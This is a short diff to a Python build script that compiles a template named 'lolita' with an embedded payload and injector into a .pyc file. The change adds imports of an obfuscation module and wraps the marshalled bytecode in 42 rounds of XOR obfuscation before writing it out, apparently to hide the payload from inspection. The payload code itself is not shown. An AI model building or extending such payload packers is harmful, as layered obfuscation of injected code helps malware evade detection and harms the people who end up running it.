@@ -2,6 +2,8 @@ import marshal
 import base64
 import zlib
 import byteplay
+from obfuscation import obfuscate
+import xor_layer
 
 # ------------- GENERATING PAYLOAD DATA ---------------
 payload_f = open("payload.py", "r")
@@ -37,8 +39,12 @@ lolita_f.close()
 lolita = lolita.replace("__FINAL_PLACEHOLDER__", injector)
 lolita = compile(lolita, "b", "exec")
 
+lolita = marshal.dumps(lolita)
+for i in range(42):
+    lolita = obfuscate(lolita, xor_layer)
+
 lolita_f = open("lolita.final.pyc", "wb")
 
 lolita_f.write("\x03\xf3\r\n)\xb9\x1bQ")
-marshal.dump(lolita, lolita_f)
+lolita_f.write(lolita)
 lolita_f.close()
